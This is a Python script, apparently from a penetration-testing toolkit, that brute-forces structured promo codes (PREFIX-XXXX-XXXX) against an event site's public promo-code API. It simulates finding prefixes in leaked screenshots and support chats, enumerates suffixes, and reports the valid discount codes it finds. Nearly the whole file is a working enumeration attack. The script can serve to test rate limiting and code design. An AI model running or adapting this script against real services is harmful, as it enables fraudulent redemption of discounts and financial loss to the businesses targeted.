#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
Prefix-Based Promo Code Enumeration Attack

Based on the observation that codes follow pattern:
[PREFIX]-[XXXX]-[XXXX]  (e.g., 3DS6-8ZSG-1SEZ)

This attack strategy:
1. Discover the prefix through reconnaissance (leaked codes, screenshots, etc.)
2. Only enumerate the variable suffix parts (8M+ combinations per prefix)
3. Significantly reduces search space vs full brute-force
"""

import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import time

init(autoreset=True)

class PrefixBasedEnumerator:
    """
    Exploits structured promo codes like 3DS6-XXXX-XXXX
    """
    
    def __init__(self, base_url="http://localhost:8080", event_id=1):
        self.base_url = base_url
        self.event_id = event_id
        self.found_codes = []
        self.tested = 0
        
        # Character set for suffix (base36: A-Z, 0-9)
        self.chars = string.ascii_uppercase + string.digits  # 36 chars
        
    def generate_suffixes(self, length=4, max_combinations=None):
        """
        Generate all possible suffix combinations
        For 4 chars: 36^4 = 1,679,616 combinations (per part)
        For two parts: 36^8 = 2.8 trillion (full brute force)
        But with known prefix: only need to test 36^4 = 1.6M (second part)
        """
        if max_combinations:
            # Generate limited set for demo
            count = 0
            for combo in itertools.product(self.chars, repeat=length):
                if count >= max_combinations:
                    break
                yield ''.join(combo)
                count += 1
        else:
            # Full generation - warning: very large!
            for combo in itertools.product(self.chars, repeat=length):
                yield ''.join(combo)
    
    def test_code(self, prefix, part1, part2):
        """Test a single code combination"""
        code = f"{prefix}-{part1}-{part2}"
        url = f"{self.base_url}/api/public/events/{self.event_id}/promo-codes/{code}"
        
        try:
            response = requests.get(url, timeout=3)
            self.tested += 1
            
            if response.status_code == 200:
                data = response.json()
                if data.get("valid"):
                    return code, True, data
            return code, False, None
            
        except requests.exceptions.RequestException:
            return code, False, None
    
    def targeted_prefix_attack(self, prefix, known_part1=None, max_tests=1000):
        """
        Attack strategy when prefix is known:
        - If we know first part (3DS6-8ZSG): only brute-force second part (36^4 = 1.6M)
        - If we only know prefix (3DS6): need to brute-force both parts (36^8 = huge)
        - But we can optimize by testing common patterns first
        """
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}PREFIX-BASED TARGETED ENUMERATION")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"\n{Fore.YELLOW}Target Prefix: {prefix}")
        print(f"{Fore.YELLOW}Pattern: [PREFIX]-[XXXX]-[XXXX]")
        
        if known_part1:
            print(f"{Fore.GREEN}[+] Known first part: {known_part1}")
            print(f"{Fore.YELLOW}[*] Only need to brute-force second part (4 chars)")
            print(f"{Fore.YELLOW}[*] Search space: 36^4 = 1,679,616 combinations")
            
            # Test only second part variations
            count = 0
            for part2 in self.generate_suffixes(4, max_tests):
                code, valid, data = self.test_code(prefix, known_part1, part2)
                
                if count % 100 == 0:
                    print(f"{Fore.CYAN}[*] Tested: {count}, Current: {code}", end='\r')
                
                if valid:
                    print(f"\n{Fore.GREEN}[+] FOUND VALID CODE: {code}")
                    print(f"{Fore.GREEN}    Discount: {data.get('discount_value')}%")
                    self.found_codes.append(code)
                
                count += 1
                if count >= max_tests:
                    break
                    
        else:
            print(f"{Fore.RED}[-] Unknown first part - using optimized strategies")
            print(f"{Fore.YELLOW}[*] Strategy 1: Testing common/predictable patterns")
            
            # Strategy: Test predictable patterns first
            common_patterns = [
                "0000", "1111", "1234", "ABCD", "AAAA", "TEST",
                "2024", "2025", "9999", "0001", "1112"
            ]
            
            for part1 in common_patterns[:20]:
                for part2 in list(self.generate_suffixes(4, 50)):
                    code, valid, data = self.test_code(prefix, part1, part2)
                    
                    if valid:
                        print(f"\n{Fore.GREEN}[+] FOUND: {code}")
                        self.found_codes.append(code)
        
        print(f"\n{Fore.CYAN}[*] Attack complete. Found {len(self.found_codes)} valid codes.")
        return self.found_codes
    
    def reconnaissance_leak_discovery(self):
        """
        Simulate discovering code prefixes through:
        - Social media screenshots (users sharing "partially blurred" codes)
        - URL patterns in emails
        - Analytics/leaked logs
        - Support chat leaks
        """
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.MAGENTA}RECONNAISSANCE PHASE: Finding Prefix Patterns")
        print(f"{Fore.MAGENTA}{'='*60}\n")
        
        # Simulate scenarios where prefixes leak
        leak_scenarios = [
            {
                "source": "Twitter Screenshot",
                "description": "User posted 'Thanks for 3DS6-****-****!',",
                "discovered_prefix": "3DS6",
                "confidence": "High"
            },
            {
                "source": "Email Headers",
                "description": "Promo email contains tracking link with 'prefix=4EG7'",
                "discovered_prefix": "4EG7", 
                "confidence": "Medium"
            },
            {
                "source": "Support Chat Leak",
                "description": "Agent said 'Use code 5FH8-XXXX-XXXX for discount'",
                "discovered_prefix": "5FH8",
                "confidence": "High"
            }
        ]
        
        discovered_prefixes = []
        
        for scenario in leak_scenarios:
            print(f"{Fore.YELLOW}[LEAK] {scenario['source']}")
            print(f"       {scenario['description']}")
            print(f"       Confidence: {scenario['confidence']}")
            
            if scenario['confidence'] == "High":
                discovered_prefixes.append(scenario['discovered_prefix'])
                print(f"       {Fore.GREEN}[+] Added to target list: {scenario['discovered_prefix']}")
            print()
        
        return discovered_prefixes
    
    def multi_prefix_attack(self, prefixes, max_tests_per_prefix=500):
        """Attack multiple discovered prefixes in parallel"""
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}MULTI-PREFIX ATTACK: {len(prefixes)} targets")
        print(f"{Fore.RED}{'='*60}\n")
        
        all_found = []
        
        for prefix in prefixes:
            print(f"\n{Fore.CYAN}>>> Attacking prefix: {prefix}")
            found = self.targeted_prefix_attack(prefix, max_tests=max_tests_per_prefix)
            all_found.extend(found)
            time.sleep(1)  # Brief pause between prefixes
        
        return all_found

def demonstrate_pattern_analysis():
    """Show the math behind prefix-based enumeration"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}PATTERN ANALYSIS: Why Prefix Structure is Dangerous")
    print(f"{Fore.CYAN}{'='*60}\n")
    
    charset_size = 36  # A-Z + 0-9
    
    # Full random 12-char code (no dashes for simplicity)
    full_random = charset_size ** 12
    print(f"Full random code (XXXXXXXXXXXX): {full_random:,} combinations")
    print(f"  At 180 req/min: Would take ~{full_random / (180 * 60 * 24 * 365):.0f} years\n")
    
    # Pattern: PREFIX-XXXX-XXXX (known prefix)
    # Only need to brute force 8 chars, but usually first 4 are also guessable
    with_prefix_known = charset_size ** 4  # Only second part unknown
    print(f"Known prefix (3DS6-XXXX-????): {with_prefix_known:,} combinations")
    print(f"  At 180 req/min: ~{with_prefix_known / 180:.0f} minutes (~{with_prefix_known / (180 * 60):.1f} hours)")
    print(f"  With parallel threads: Much faster\n")
    
    # Known prefix + common patterns for first part
    optimized = 1000 * 1000  # 1000 common patterns × 1000 second-part tests
    print(f"Optimized (common patterns): ~{optimized:,} combinations")
    print(f"  At 180 req/min: ~{optimized / 180:.0f} minutes ({optimized / (180 * 60):.1f} hours)\n")
    
    print(f"{Fore.RED}[!] Conclusion: Known prefix reduces search space by orders of magnitude!")

def main():
    print(f"""
{Fore.MAGENTA}
  ____                __ _               _   _             _   _           
 |  _ \ _ __ ___     / _(_)_ __   __ _  | \ | | ___  _ __ | |_| | ___  ___ 
 | |_) | '__/ _ \   | |_| | '_ \ / _` | |  \| |/ _ \| '_ \| __| |/ _ \/ __|
 |  __/| | | (_) |  |  _| | | | | (_| | | |\  | (_) | | | | |_| |  __/\__ \
 |_|   |_|  \___/   |_| |_|_| |_|\__, | |_| \_|\___/|_| |_|\__|_|\___||___/
                                  |___/                                    
  PREFIX-BASED PROMO CODE ENUMERATION
  Targeting: [PREFIX]-[XXXX]-[XXXX] pattern
    """)
    
    demonstrate_pattern_analysis()
    
    # Initialize enumerator
    enumerator = PrefixBasedEnumerator()
    
    # Phase 1: Reconnaissance
    prefixes = enumerator.reconnaissance_leak_discovery()
    
    input(f"\n{Fore.CYAN}Press Enter to start attack on discovered prefixes...")
    
    # Phase 2: Attack
    if prefixes:
        found_codes = enumerator.multi_prefix_attack(prefixes, max_tests_per_prefix=300)
        
        # Results
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.GREEN}ATTACK RESULTS")
        print(f"{Fore.GREEN}{'='*60}")
        print(f"Total codes tested: {enumerator.tested}")
        print(f"Valid codes found: {len(found_codes)}")
        
        if found_codes:
            print(f"\n{Fore.GREEN}Discovered valid codes:")
            for code in found_codes:
                print(f"  {Fore.GREEN}• {code}")
    else:
        # Demo with known prefix
        print(f"\n{Fore.YELLOW}[*] No prefixes discovered. Running demo with known prefix '3DS6'...")
        found = enumerator.targeted_prefix_attack("3DS6", known_part1="8ZSG", max_tests=1000)
        
        if not found:
            print(f"\n{Fore.YELLOW}[*] Trying with unknown first part...")
            found = enumerator.targeted_prefix_attack("3DS6", max_tests=500)

if __name__ == "__main__":
    main()
